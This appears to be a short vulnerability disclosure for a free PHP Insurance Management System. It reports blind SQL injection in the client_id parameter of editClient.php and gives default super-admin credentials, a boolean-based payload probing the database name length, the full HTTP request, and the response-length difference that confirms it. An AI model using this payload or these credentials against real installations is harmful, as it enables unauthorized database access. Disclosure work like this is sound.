# Insurance Management System v1.0 by oretnom23 has SQL injection

Author： k0xx

vendors: https://itsourcecode.com/free-projects/php-project/insurance-management-system-project-in-php-free-download/

Login account: ahmed/12345 (Super Admin account)

Vulnerability File: /insurance/editClient.php?client_id=

Vulnerability location:  /insurance/editClient.php?client_id=,client_id

[+] Payload: /insurance/editClient.php?client_id=1511986256%27%20and%20length(database())%20=4--+ // Leak place ---> client_id

Current database name: lims,length is 4

```sql
GET /insurance/editClient.php?client_id=1511986256%27%20and%20length(database())%20=4--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=tmbv0mt5ff9hphhe0mtv4sghfq
Connection: close
```

When length (database ()) = 3, Content-Length: 4084

![image](https://user-images.githubusercontent.com/54017627/166145231-f6a8c536-bb1e-4d06-9503-2d3f2783f59d.png)

![image](https://user-images.githubusercontent.com/54017627/166145253-30315002-51dd-4457-8f8f-8d117d8e22fe.png)

When length (database ()) = 4, Content-Length: 6008

![image](https://user-images.githubusercontent.com/54017627/166145225-dc268e52-5650-4e99-bc9e-df6b2865b96d.png)

![image](https://user-images.githubusercontent.com/54017627/166145241-e1e8f7fa-2d8c-4882-b1ba-235fe2dd20c8.png)


